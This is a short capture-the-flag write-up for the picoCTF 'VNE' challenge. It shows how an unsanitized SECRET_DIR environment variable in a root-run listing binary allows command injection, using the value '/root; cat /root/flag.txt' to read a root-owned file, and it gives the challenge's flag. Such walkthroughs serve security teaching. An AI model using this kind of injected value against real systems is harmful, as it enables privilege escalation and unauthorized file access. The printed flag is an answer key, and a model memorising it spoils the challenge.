# VNE

## Challenge

### Description

We've got a binary that can list directories as root, try it out !!

`ssh` to `saturn.picoctf.net:62361`, and run the binary named "bin" once connected. Login as `ctf-player` with the password.

### Hints

1. Have you checked the content of the /root folder
2. Find a way to add more instructions to the ls

## Solution

As the hints say, we execute the `bin` file and get this error.

```console
$ ./bin
Error: SECRET_DIR environment variable is not set
```

We set the environment variable with `export SECRET_DIR=/root` and run the file again.

```console
$ ./bin
Listing the content of /root as root: 
flag.txt
```

We found the flag file. Now if the command is not properly sanitize, we can inject code by modifying `SECRET_DIR` variable.

```console
$ export SECRET_DIR="/root; cat /root/flag.txt"
```

And run the `bin` file again. We should then get the flag.

## Flag

picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}
